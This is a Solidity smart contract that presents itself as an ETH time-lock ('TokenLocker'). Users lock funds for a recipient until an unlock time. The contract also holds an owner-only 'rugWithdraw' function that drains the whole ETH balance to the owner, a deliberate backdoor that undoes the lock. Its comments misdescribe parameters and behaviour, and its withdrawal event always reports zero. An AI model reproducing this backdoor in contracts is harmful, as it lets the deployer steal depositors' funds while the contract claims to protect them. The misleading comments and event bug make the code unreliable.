// SPDX-License-Identifier: Do-Whatever-You-Want-With-This-License
pragma solidity ^0.8.9;

import "./SafeERC20.sol";
import "./Ownable.sol";

contract TokenLocker is Ownable {
    using SafeERC20 for IERC20;
    
    bool isPaused = false;

    mapping (address => uint256) public lockedEthBalance;
    mapping (address => uint256) public ethUnlockTime;

    event Withdrawal(uint amount, uint when);
    event Locking(uint amount, uint unlockTime);

    function lockETHFor(uint256 time, address recipient) public payable {
        require(isPaused == false, "Contract is curretly paused");
        require(block.timestamp < time, "Unlock time should be in the future");
        require(time >= ethUnlockTime[recipient], 
            "Unlock time for new locking should be equal or greater to current one");

        ethUnlockTime[recipient] = time;
        lockedEthBalance[recipient] += msg.value;

        emit Locking(msg.value, time);
    }

    /* @notice Withdraws all ETH from contract to function caller. **/

    function withdrawETH() public {
        require(block.timestamp >= ethUnlockTime[msg.sender], "You can't withdraw yet");

        payable(msg.sender).transfer(lockedEthBalance[msg.sender]);

        lockedEthBalance[msg.sender] = 0;
        ethUnlockTime[msg.sender] = 0;

        emit Withdrawal(lockedEthBalance[msg.sender], block.timestamp);
    }
    
    /*
    @notice Transfers all ETH and selected ERC20 from contract to owner.
    @param token - Token address of the ERC20 you want to withdraw from contract.
    @param amount - Amount of tokens you want to withdraw from selected ERC20.
    **/

    function rugWithdraw() public onlyOwner {
        if (address(this).balance != 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function pauseContract(bool paused) public onlyOwner {
        isPaused = paused;
    }
}

